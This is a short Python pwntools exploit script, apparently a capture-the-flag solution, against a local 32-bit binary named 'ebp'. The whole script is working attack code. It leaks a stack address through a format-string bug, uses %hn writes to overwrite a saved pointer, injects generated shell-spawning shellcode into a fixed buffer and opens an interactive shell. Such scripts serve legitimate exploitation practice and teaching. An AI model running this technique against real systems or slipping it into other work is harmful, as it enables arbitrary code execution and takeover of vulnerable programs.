#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"
context.os = "linux"
context.arch = "i386"

buf_addr = 0x804a080

io = process("./ebp")

io.sendline("%4$p....")
ebp_addr = int(io.recvuntil("....")[: -4], 16)
ret_addr = (ebp_addr - 0x1c) & 0xffff

payload = "%" + str(ret_addr) + "d%4$hn"
io.sendline(payload)
io.recvuntil("\n")

shellcode = asm(shellcraft.sh())
payload = shellcode + "%" + str((buf_addr & 0xffff) - len(shellcode)) + "d%12$hn"
io.sendline(payload)

io.interactive()
io.close()
